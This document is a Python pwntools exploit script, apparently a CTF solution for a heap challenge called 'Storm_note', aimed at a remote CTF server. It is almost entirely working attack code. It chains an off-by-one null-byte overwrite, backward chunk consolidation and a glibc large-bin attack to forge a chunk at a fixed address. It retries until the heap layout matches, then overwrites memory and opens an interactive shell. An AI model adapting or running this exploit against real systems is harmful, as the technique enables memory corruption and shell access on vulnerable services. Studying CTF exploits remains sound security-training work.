from pwn import *

def add(size):
  p.recvuntil('Choice')
  p.sendline('1')
  p.recvuntil('?')
  p.sendline(str(size))
  
def edit(idx,data):
  p.recvuntil('Choice')
  p.sendline('2')
  p.recvuntil('?')
  p.sendline(str(idx))
  p.recvuntil('Content')
  p.send(data)

def dele(idx):
  p.recvuntil('Choice')
  p.sendline('3')
  p.recvuntil('?')
  p.sendline(str(idx))

def exploit():

    global p

    while True:
		#p=process('./Storm_note')
		p=remote('ctf1.linkedbyx.com',10444)
		add(0x18)     #0
		add(0x508)    #1
		add(0x18)     #2
		edit(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
		
		add(0x18)     #3
		add(0x508)    #4
		add(0x18)     #5
		edit(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
		add(0x18)     #6
		
		dele(1)
		edit(0, 'h'*(0x18))    #off-by-one
		add(0x18)     #1
		add(0x4d8)    #7
		dele(1)
		dele(2)         #backward consolidate
		add(0x38)     #1
		add(0x4e8)    #2
		
		dele(4)
		edit(3, 'h'*(0x18))    #off-by-one
		add(0x18)     #4
		add(0x4d8)    #8
		dele(4)
		dele(5)       #backward consolidate
		add(0x48)     #4
		
		dele(2)
		add(0x4e8)    #2
		dele(2)
		storage = 0xabcd0100
		fake_chunk = storage - 0x20
		
		p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
		p1 += p64(0) + p64(fake_chunk)      #bk
		edit(7, p1)
		
		p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
		p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
		p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
		edit(8, p2)
		try:
		   # if the heap address starts with "0x56", you win
		    add(0x48)     #2
		except EOFError:
		   # otherwise crash and try again
		    p.close()
		    continue
		
		edit(2,p64(0)*8)
		
		p.sendline('666')
		p.send('\x00'*0x30)
		
		break


if __name__ == '__main__':

    exploit()
    p.interactive()
